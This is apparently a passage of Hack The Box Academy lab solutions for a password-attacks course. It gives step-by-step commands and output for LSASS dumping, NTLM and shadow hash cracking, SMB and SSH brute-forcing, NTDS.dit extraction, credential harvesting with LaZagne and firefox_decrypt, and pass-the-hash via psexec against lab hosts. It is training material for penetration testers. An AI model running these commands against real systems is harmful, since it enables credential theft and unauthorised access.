[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Students need to transfer the dump file over to the `SMB` share using PowerShell:

Code: shell

```shell
move C:\lsass.dmp \\PWNIP\share
```

```
PS C:\Windows\system32> move C:\lsass.dmp \\10.10.14.249\Share
```

Afterward, students need to install `pypykatz` using `pip3`:

Code: shell

```shell
pip3 install pypykatz
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-mpzg89tbcv]─[~/Password-Attacks/pypykatz/pypykatz]
└──╼ [★]$ pip3 install pypykatz

WARNING: Keyring is skipped due to an exception: Failed to create the collection: Prompt dismissed..
Collecting pypykatz
  Downloading pypykatz-0.6.2-py3-none-any.whl (384 kB)
     |████████████████████████████████| 384 kB 13.9 MB/s 
Collecting winacl>=0.1.5
  Downloading winacl-0.1.5-py3-none-any.whl (51 kB)
     |████████████████████████████████| 51 kB 328 kB/s 
<SNIP
Installing collected packages: asn1crypto, unicrypto, oscrypto, cryptography, asysocks, winacl, minikerberos, asyauth, aiowinreg, msldap, minidump, aiosmb, aesedb, pypykatz
Successfully installed aesedb-0.1.0 aiosmb-0.4.3 aiowinreg-0.0.7 asn1crypto-1.5.1 asyauth-0.0.5 asysocks-0.2.2 cryptography-38.0.1 minidump-0.0.21 minikerberos-0.3.3 msldap-0.4.6 oscrypto-1.3.0 pypykatz-0.6.2 unicrypto-0.0.9 winacl-0.1.5
```

Then, students need to run `pypykatz` locally against the `lsass.dmp` file:

Code: shell

```shell
pypykatz lsa minidump ~/Password-Attacks/lsass.dmp
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-mpzg89tbcv]─[~/Password-Attacks/pypykatz/pypykatz]
└──╼ [★]$ pypykatz lsa minidump ~/Password-Attacks/lsass.dmp 

INFO:pypykatz:Parsing file /home/htb-ac330204/Password-Attacks/lsass.dmp

<SNIP>

== LogonSession ==
authentication_id 126879 (1ef9f)
session_id 0
username Vendor
domainname FS01
logon_server FS01
logon_time 2022-10-10T15:33:08.540211+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1003
luid 126879
	== MSV ==
		Username: Vendor
		Domain: FS01
		LM: NA
		NT: 31f87811133bc6aaa75a536e77f64314
		SHA1: 2b1c560c35923a8936263770a047764d0422caba
		DPAPI: NA
```

With the hash `31f87811133bc6aaa75a536e77f64314` of `Vendor` now obtained, students need to crack it with `Hashcat`, utilizing hashmode 1000:

Code: shell

```shell
hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-mpzg89tbcv]─[~/Password-Attacks]
└──╼ [★]$ hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

31f87811133bc6aaa75a536e77f64314:Mic@123         
 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: 31f87811133bc6aaa75a536e77f64314
```

From the output of `Hashcat`, students will know that the password of `Vendor` is `Mic@123`.

Answer: `Mic@123`

# Attacking Active Directory & NTDS.dit

## Question 1

### "What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format:\*\*\*\*.\*\*\*)"

Students can find the answer `NTDS.dit` by reading the module's section:

![[HTB Solutions/CPTS/z. images/02cf45cea5b77db2d0b4f8a93a148c5f_MD5.jpg]]

Answer: `NTDS.dit`

# Attacking Active Directory & NTDS.dit

## Question 2

### "Submit the NT hash associated with the Administrator user from the example output in the section reading."

Students can find the hash `64f12cddaa88057e06a81b54e73b949b` by looking at the `crackmapexec` output shown in the module's section:

![[HTB Solutions/CPTS/z. images/60b4cdfdc9c265c1939e384616f35bc2_MD5.jpg]]

Answer: `64f12cddaa88057e06a81b54e73b949b`

# Attacking Active Directory & NTDS.dit

## Question 3

### "On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)"

Reading the hint provided for this question, students will attain useful information:

![[HTB Solutions/CPTS/z. images/17525dcecf8d523f5edb8c529cd0dc3c_MD5.jpg]]

Therefore, using the username `jmartson` (from `John Marston`) students can crack the password of the user with `crackmapexec`:

Code: shell

```shell
sudo cme smb STMIP -u jmarston -p /usr/share/wordlists/fasttrack.txt
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-mpzg89tbcv]─[~/Password-Attacks]
└──╼ [★]$ sudo cme smb 10.129.202.85 -u jmarston -p /usr/share/wordlists/fasttrack.txt

/root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/paramiko/transport.py:236: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.129.202.85   445    ILF-DC01         [*] Windows 10.0 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Spring2017 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Spring2016 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Spring2015 STATUS_LOGON_FAILURE

<SNIP>

SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:P@55w0rd! STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
```

From the output of `crackmapexec`, students will know that the password for `jmarston` is `P@ssword!`.

Answer: `jmarston:P@ssword!`

# Attacking Active Directory & NTDS.dit

## Question 4

### "Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)"

Given that the students have attained the credentials `jmarston:P@ssword!` from the previous question, they need to use them to dump the `NTDS.dit` file using `crackmapexec`:

Code: shell

```shell
sudo cme smb STMIP -u jmarston -p P@ssword! --ntds
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-mpzg89tbcv]─[~/Password-Attacks]
└──╼ [★]$ sudo cme smb 10.129.202.85 -u jmarston -p P@ssword! --ntds

/root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/paramiko/transport.py:236: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.129.202.85   445    ILF-DC01         [*] Windows 10.0 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
SMB         10.129.202.85   445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.202.85   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
SMB         10.129.202.85   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.202.85   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
SMB         10.129.202.85   445    ILF-DC01         ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
SMB         10.129.202.85   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
SMB         10.129.202.85   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
SMB         10.129.202.85   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
SMB         10.129.202.85   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:25bb44b17061ed38be4016d512d14a51:::
SMB         10.129.202.85   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
SMB         10.129.202.85   445    ILF-DC01         [+] Dumped 9 NTDS hashes to /root/.cme/logs/ILF-DC01_10.129.202.85_2022-10-10_174222.ntds of which 7 were added to the database
```

Subsequently, students need to crack the hash `92fd67fd2f49d0e83744aa82363f021b` of `jstapleton` using `Hashcat`:

Code: shell

```shell
hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-mpzg89tbcv]─[~/Password-Attacks]
└──╼ [★]$ hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

92fd67fd2f49d0e83744aa82363f021b:Winter2008      
 
Session..........: hashcat
Status...........: Cracked
```

From the output of `Hashcat`, students will know that the password of `jstapleton` is `Winter2008`.

Answer: `Winter2008`

# Credential Hunting in Windows

## Question 1

### "What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive)"

Students first need to connect to the spawned target machine using `xfreerdp` with the credentials `Bob:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Bob /p:HTB_@cademy_stdnt!
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~]
└──╼ [★]$ xfreerdp /v:10.129.202.99 /u:bob /p:HTB_@cademy_stdnt!

[19:23:52:521] [7285:7286] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[19:23:52:521] [7285:7286] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
<SNIP>
```

Subsequently, students need to open the file `passwords`, which is inside of `WorkStuff/Creds/`:

![[HTB Solutions/CPTS/z. images/0c15dd8ca647f8297d3b7b73ad3619a9_MD5.jpg]]

Within the file, students will find the credentials `admin:WellConnected123` for "Switches via SSH":

![[HTB Solutions/CPTS/z. images/feb2adf772048e24256843fe94d3bd64_MD5.jpg]]

Therefore, the password Bob uses for connecting to switches via SSH is `WellConnected123`.

Answer: `WellConnected123`

# Credential Hunting in Windows

## Question 2

### "What is the GitLab access code Bob uses? (Format: Case Sensitive)"

Using the previously established RDP session, students need to open the file `GitlabAccessCodeJustIncase.txt`, which is inside of `WorkStuff/`, to find the password `3z1ePfGbjWPsTfCsZfjy`:

![[HTB Solutions/CPTS/z. images/12731ef08eb8fe0aee5220350d4f7213_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/ca61bcd3dd84bbb75115fd9d3ae514c4_MD5.jpg]]

Answer: `3z1ePfGbjWPsTfCsZfjy`

# Credential Hunting in Windows

## Question 3

### "What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)"

Students first need to download `lazagne.exe` from the [GitHub repo](https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe):

Code: shell

```shell
wget https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~]
└──╼ [★]$ wget https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe

--2022-10-10 19:32:54--  https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
<SNIP>
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6635326 (6.3M) [application/octet-stream]
Saving to: ‘lazagne.exe’

lazagne.exe         100%[===================>]   6.33M  35.7MB/s    in 0.2s    

2022-10-10 19:32:55 (35.7 MB/s) - ‘lazagne.exe’ saved [6635326/6635326]
```

Subsequently, students then need to start a `Python` HTTP server to prepare to move `lazagne.exe` to the spawned target:

Code: shell

```shell
python3 -m http.server PWNPO
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~]
└──╼ [★]$ python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Using the previously established RDP session, students need to open PowerShell as administrator and fetch `lazagne.exe`:

Code: powershell

```powershell
wget "http://PWNIP:PWNPO/lazagne.exe" -o "C:\Users\Bob\Desktop\lazagne.exe"
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> wget "http://10.10.14.249:8080/lazagne.exe" -o "C:\Users\Bob\Desktop\lazagne.exe"
```

Students now need to run `lazagne` with all modules:

Code: powershell

```powershell
lazagne.exe all
```

```
PS C:\Windows\system32> C:\Users\bob\Desktop\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for cbf5956a-5229-4238-838f-222660dc77e9
[+] System masterkey decrypted for 6a505802-6b1c-4420-bcb1-5085b201d5c0
[+] System masterkey decrypted for 83c23bf4-30df-4c94-96d6-e2c4cfcc74b2
[+] System masterkey decrypted for 02cc30f2-e04d-4901-9407-2872e141e75d
[+] System masterkey decrypted for 66c0784c-3191-4a2b-92e3-78e4d7986659

<SNIP>

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.64
Login: ubuntu
Password: FSadmin123
Port: 22

[+] 1 passwords have been found.
For more information launch it again with the -v option

elapsed time = 40.5309998989
```

From the output of `lazagne.exe`, students will know that the credentials Bob uses with WinSCP to connect to the file server are `ubuntu:FSadmin123`.

Answer: `ubuntu:FSadmin123`

# Credential Hunting in Windows

## Question 4

### "What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive)"

Using the previously established RDP session, students need to investigate the `C:\` drive and find the `BulkaddADusers.ps1` file within `C:\Automations&Scripts`:

![[HTB Solutions/CPTS/z. images/52e5c7175def4b611f8f69582a422ef7_MD5.jpg]]

Students need to open the file with `Notepad`, and inside it discover that the default password of every newly created Inlanefreight Domain user account is `Inlanefreightisgreat2022`:

![[HTB Solutions/CPTS/z. images/9e497acd5b7ede1a9f053ced2505af7f_MD5.jpg]]

Answer: `Inlanefreightisgreat2022`

# Credential Hunting in Windows

## Question 5

### "What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)"

Using the previously established RDP session, students need to open the file `C:\Automations&Scripts\AnsibleScripts\EdgeRouterConfigs` in a text editor, such as `Visual Studio Code`, and scroll to the bottom to discover the credentials `edgeadmin:Edge@dmin123!`:

![[HTB Solutions/CPTS/z. images/3f5d5fdd4afb1d794986e5f3c522f3ff_MD5.jpg]]

Answer: `edgeadmin:Edge@dmin123!`

# Credential Hunting in Linux

## Question 1

### "Examine the target and find out the password of the user Will. Then, submit the password as the answer."

Students first need to make sure that `firefox_decrypt.py` is on Pwnbox/`PMVPN`, which can be cloned from its [GitHub repo](https://github.com/unode/firefox_decrypt.git):

Code: shell

```shell
git clone https://github.com/unode/firefox_decrypt.git
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~]
└──╼ [★]$ git clone https://github.com/unode/firefox_decrypt.git

Cloning into 'firefox_decrypt'...
remote: Enumerating objects: 1152, done.
remote: Counting objects: 100% (264/264), done.
remote: Compressing objects: 100% (31/31), done.
remote: Total 1152 (delta 246), reused 235 (delta 233), pack-reused 888
Receiving objects: 100% (1152/1152), 411.61 KiB | 1.51 MiB/s, done.
Resolving deltas: 100% (728/728), done.
```

Subsequently, students need to download [Password-Attacks.zip](https://academy.hackthebox.com/storage/resources/Password-Attacks.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip && unzip Password-Attacks.zip
```

```
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tgnd7xlrrl]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip && unzip Password-Attacks.zip

--2022-11-22 12:14:07--  https://academy.hackthebox.com/storage/resources/Password-Attacks.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6268 (6.1K) [application/zip]
Saving to: ‘Password-Attacks.zip’

Password-Attacks.zip                    100%[=============================================================================>]   6.12K  --.-KB/s    in 0s      

2022-11-22 12:14:07 (35.0 MB/s) - ‘Password-Attacks.zip’ saved [6268/6268]

Archive:  Password-Attacks.zip
   creating: Password-Attacks/
  inflating: __MACOSX/._Password-Attacks  
  inflating: Password-Attacks/password.list  
  inflating: __MACOSX/Password-Attacks/._password.list  
  inflating: Password-Attacks/custom.rule  
  inflating: __MACOSX/Password-Attacks/._custom.rule  
  inflating: Password-Attacks/username.list  
  inflating: __MACOSX/Password-Attacks/._username.list
```

Students then need to create a mutated wordlist with `Hashcat`, utilizing the passwords file `password.list` and `custom.rule` for the mutations rules file:

Code: shell

```shell
hashcat Password-Attacks/password.list -r Password-Attacks/custom.rule --stdout | sort -u > mut_password.list
```

```
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tgnd7xlrrl]─[~]
└──╼ [★]$ hashcat Password-Attacks/password.list -r Password-Attacks/custom.rule --stdout | sort -u > mut_password.list
```

Using the hint provided for this question, students know that they ought to trim down the `mut_password.list` file starting at passwords similar to "Loveyou1":

![[HTB Solutions/CPTS/z. images/ecdaac8f368394a482b8d2c9215e96bf_MD5.jpg]]

Therefore, students can use `sed` to remove lines from 1 up to (and including) 49009:

Code: shell

```shell
sed -e '1,49009d;' mut_password.list > kira_password.list
```

```
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-milkcprusm]─[~]
└──╼ [★]$ sed -e '1,49009d;' mut_password.list > kira_password.list
```

Subsequently, students need to bruteforce SSH using `Hydra` utilizing the password list `kira_password.list`:

Code: shell

```shell
hydra -l kira -P kira_password.list ssh://STMIP
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~]
└──╼ [★]$ hydra -l kira -P kira_password.list ssh://10.129.84.74

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \`\`\`* ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-10 20:08:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 45232 login tries (l:1/p:45232), ~2827 tries per task
[DATA] attacking ssh://10.129.84.74:22/
[STATUS] 158.00 tries/min, 158 tries in 00:01h, 45077 to do in 04:46h, 16 active
[STATUS] 113.00 tries/min, 339 tries in 00:03h, 44896 to do in 06:38h, 16 active
[STATUS] 105.86 tries/min, 741 tries in 00:07h, 44494 to do in 07:01h, 16 active
[22][ssh] host: 10.129.84.74   login: kira   password: L0vey0u1!

1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-10 20:16:23
```

From the output of `Hydra`, students will know that the password of `kira` is `L0vey0u1!`. Thus, students need to connect to the spawned target using `SSH` with the credentials `kira:L0vey0u1!`:

Code: shell

```shell
ssh kira@STMIP
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~/Password-Attacks]
└──╼ [★]$ ssh kira@10.129.84.74

The authenticity of host '10.129.84.74 (10.129.84.74)' can't be established.
ECDSA key fingerprint is SHA256:AelxWP/kQK76SQAaNbbaRFJ8vSmDBr/XB8/66aPreGs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.84.74' (ECDSA) to the list of known hosts.
kira@10.129.84.74's password: 

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

kira@nix01:~$
```

Then, students need to start a Python HTTP server from Pwnbox/`PMVPN` to prepare for transferring `firefox_decrypt.py`:

Code: shell

```shell
python3 -m http.server PWNPO
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~/Password-Attacks/firefox_decrypt]
└──╼ [★]$ python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

From the `SSH` session, students need to navigate to `~/.mozilla/firefox/ytb95ytb.default-release` and then download `firefox_decrypt.py`:

Code: shell

```shell
cd ~/.mozilla/firefox/ytb95ytb.default-release
wget http://PWNIP:PWNPO/firefox_decrypt.py
```

```
kira@nix01:~$ cd ~/.mozilla/firefox/ytb95ytb.default-release/
kira@nix01:~/.mozilla/firefox/ytb95ytb.default-release$ wget http://10.10.14.249:8080/firefox_decrypt.py

--2022-10-10 19:21:56--  http://10.10.14.249:8080/firefox_decrypt.py
Connecting to 10.10.14.249:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 37350 (36K) [text/x-python]
Saving to: ‘firefox_decrypt.py’

firefox_decrypt.py             100%[=================================================>]  36.47K  --.-KB/s    in 0.07s   

2022-10-10 19:21:56 (491 KB/s) - ‘firefox_decrypt.py’ saved [37350/37350]
```

Then, students need to run `firefox_decrypt.py`:

Code: shell

```shell
python3.9 firefox_decrypt.py
```

```
kira@nix01:~/.mozilla/firefox/ytb95ytb.default-release$ python3.9 firefox_decrypt.py 

Select the Mozilla profile you wish to decrypt
1 -> lktd9y8y.default
2 -> ytb95ytb.default-release
2

Website:   https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: 'TUqr7QfLTLhruhVbCP'
```

From the output of `firefox_decrypt.py`, students will know that the password of the user `will` is `TUqr7QfLTLhruhVbCP`.

Answer: `TUqr7QfLTLhruhVbCP`

# Passwd, Shadow & Opasswd

## Question 1

### "Examine the target using the credentials from the user Will and find out the password of the "root" user. Then, submit the password as the answer."

Students first need to connect to the spawned target using `SSH` with the previously harvested credentials `will:TUqr7QfLTLhruhVbCP`:

Code: shell

```shell
ssh will@STMIP
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~/Password-Attacks]
└──╼ [★]$ ssh will@10.129.84.74

will@10.129.84.74's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

will@nix01:~$ 
```

Then, students need to navigate to `~/.backups` and observe the `passwd.bak` and `shadow.bak` files, noticing that they have been given the `read` permission to the group `will`:

```
will@nix01:~$ cd ~/.backups/
will@nix01:~/.backups$ ls -la

total 16
drwxrwxr-x 2 will will 4096 Feb  9  2022 .
drwxr-xr-x 5 will will 4096 Oct 10 19:25 ..
-rw-r--r-- 1 will will 2619 Feb  9  2022 passwd.bak
-rw-r----- 1 will will 1724 Feb  9  2022 shadow.bak
```

From the established `SSH` session, students need to start a Python HTTP server to prepare to exfiltrate the files:

Code: shell

```shell
python3 -m http.server PWNPO
```

```
will@nix01:~/.backups$ python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

From Pwnbox/`PMVPN`, students need to download both files:

Code: shell

```shell
wget http://STMIP:STMPO/passwd.bak
wget http://STMIP:STMPO/shadow.bak
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~/Password-Attacks]
└──╼ [★]$ wget http://10.129.84.74:8080/passwd.bak

--2022-10-10 20:34:59--  http://10.129.84.74:8080/passwd.bak
Connecting to 10.129.84.74:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2619 (2.6K) [application/x-trash]
Saving to: ‘passwd.bak’

passwd.bak                     100%[=================================================>]   2.56K  --.-KB/s    in 0.001s  

2022-10-10 20:34:59 (4.79 MB/s) - ‘passwd.bak’ saved [2619/2619]

┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~/Password-Attacks]
└──╼ [★]$ wget http://10.129.84.74:8080/shadow.bak

--2022-10-10 20:35:06--  http://10.129.84.74:8080/shadow.bak
Connecting to 10.129.84.74:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1724 (1.7K) [application/x-trash]
Saving to: ‘shadow.bak’

shadow.bak                     100%[=================================================>]   1.68K  --.-KB/s    in 0s      

2022-10-10 20:35:06 (249 MB/s) - ‘shadow.bak’ saved [1724/1724]
```

Students then need to combine the two files using `unshadow`:

Code: shell

```shell
unshadow passwd.bak shadow.bak > unshadowed.hashes
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~/Password-Attacks]
└──╼ [★]$ unshadow passwd.bak shadow.bak > unshadowed.hashes

Created directory: /home/htb-ac330204/.john
```

Students then need to download [Password-Attacks.zip](https://academy.hackthebox.com/storage/resources/Password-Attacks.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip && unzip Password-Attacks.zip
```

```
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tgnd7xlrrl]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip && unzip Password-Attacks.zip

--2022-11-22 12:14:07--  https://academy.hackthebox.com/storage/resources/Password-Attacks.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6268 (6.1K) [application/zip]
Saving to: ‘Password-Attacks.zip’

Password-Attacks.zip                    100%[=============================================================================>]   6.12K  --.-KB/s    in 0s      

2022-11-22 12:14:07 (35.0 MB/s) - ‘Password-Attacks.zip’ saved [6268/6268]

Archive:  Password-Attacks.zip
   creating: Password-Attacks/
  inflating: __MACOSX/._Password-Attacks  
  inflating: Password-Attacks/password.list  
  inflating: __MACOSX/Password-Attacks/._password.list  
  inflating: Password-Attacks/custom.rule  
  inflating: __MACOSX/Password-Attacks/._custom.rule  
  inflating: Password-Attacks/username.list  
  inflating: __MACOSX/Password-Attacks/._username.list
```

Subsequently, students need to create a mutated wordlist with `Hashcat`, utilizing the passwords file `password.list` and `custom.rule` for the mutations rules file:

Code: shell

```shell
hashcat Password-Attacks/password.list -r Password-Attacks/custom.rule --stdout | sort -u > mut_password.list
```

```
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tgnd7xlrrl]─[~]
└──╼ [★]$ hashcat Password-Attacks/password.list -r Password-Attacks/custom.rule --stdout | sort -u > mut_password.list
```

At last, students need to crack the hashes using `John`:

Code: shell

```shell
john unshadowed.hashes --wordlist=mut_password.list
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~/Password-Attacks]
└──╼ [★]$ john unshadowed.hashes --wordlist=mut_password.list

Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
B@tm@n2022!      (sam)
J0rd@n5          (root)
2g 0:00:00:50 DONE (2022-10-10 20:41) 0.03937g/s 1851p/s 4901c/s 4901C/s Yell0w2020!..Yellow99!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The password of the `root` user is `J0rd@n5`.

Answer: `J0rd@n5`

# Pass the Hash (PtH)

## Question 1

### "Access the target machine using any Pass-the-Hash tool. What's the content of the file C:\\pth.txt."

Students need to connect to the spawned target, passing the hash with `psexec` using the username `administrator` and the hash `30B3783CE2ABF1AF70F77D0660CF3453`:

Code: shell

```shell
impacket-psexec administrator@STMIP -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

```
┌─[us-academy-1]─[10.10.14.148]─[htb-ac330204@htb-w12mhmofex]─[~]
└──╼ [★]$ impacket-psexec administrator@10.129.72.92 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.72.92.....
[*] Found writable share ADMIN$
[*] Uploading file rSoARVWf.exe
[*] Opening SVCManager on 10.129.72.92.....
[*] Creating service asgs on 10.129.72.92.....
[*] Starting service asgs.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

